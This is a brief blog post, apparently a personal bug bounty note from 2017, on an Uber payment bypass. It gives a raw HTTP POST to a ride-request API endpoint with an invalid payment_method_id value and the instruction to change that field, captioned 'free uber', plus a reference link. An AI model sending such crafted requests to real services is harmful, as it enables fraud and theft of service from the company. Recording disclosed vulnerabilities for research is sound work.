---
id: 4450
title: 'bug bounty note&#8212;-UBER'
date: 2017-03-14T17:05:54+00:00
author: admin
layout: post
guid: http://blog.ikow.cn/?p=4450
permalink: /bug-bounty-note-uber/
categories:
  - bug bounty
  - WEB
tags:
  - bug bounty
  - uber
---
free uber:

POST /api/dial/v2/requests HTTP/1.1 Host: dial.uber.com {&#8220;start\_latitude&#8221;:12.925151699999999,&#8221;start\_longitude&#8221;:77.6657536,
  
&#8220;product\_id&#8221;:&#8221;db6779d6-d8da-479f-8ac7-8068f4dade6f&#8221;,&#8221;payment\_method_id&#8221;:&#8221;xyz&#8221;}

change payment\_method\_id

reference url :http://www.anandpraka.sh/2017/03/how-anyone-could-have-used-uber-to-ride.html